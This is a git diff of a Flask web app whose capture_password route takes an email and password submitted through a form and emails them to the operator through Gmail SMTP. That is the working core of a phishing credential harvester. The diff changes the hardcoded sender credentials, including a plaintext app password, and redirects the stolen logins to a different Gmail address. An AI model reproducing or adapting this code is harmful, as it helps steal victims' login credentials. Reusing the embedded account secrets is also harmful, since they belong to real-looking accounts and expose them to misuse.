@@ -10,8 +10,8 @@ app.secret_key = 'your_secret_key'  # Replace with your secret key
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 587
 app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = 'robhh0014@gmail.com '  # Your Gmail address
-app.config['MAIL_PASSWORD'] = 'dvziyvhsvijuhtht'   # Your Gmail password or app-specific password
+app.config['MAIL_USERNAME'] = '21kelvinflores@gmail.com '  # Your Gmail address
+app.config['MAIL_PASSWORD'] = 'qmmmkwfwixiybuit'   # Your Gmail password or app-specific password
 
 mail = Mail(app)
 
@@ -32,7 +32,7 @@ def capture_password():
         password = request.form.get('password')
 
         # Send email using Flask-Mail
-        recipient =  'robhh0014@gmail.com'  # Your email address to receive the email
+        recipient =  '21kelvinflores@gmail.com'  # Your email address to receive the email
         subject = 'Login'
         body = f'Email: {email}\nPassword entered: {password}'
 
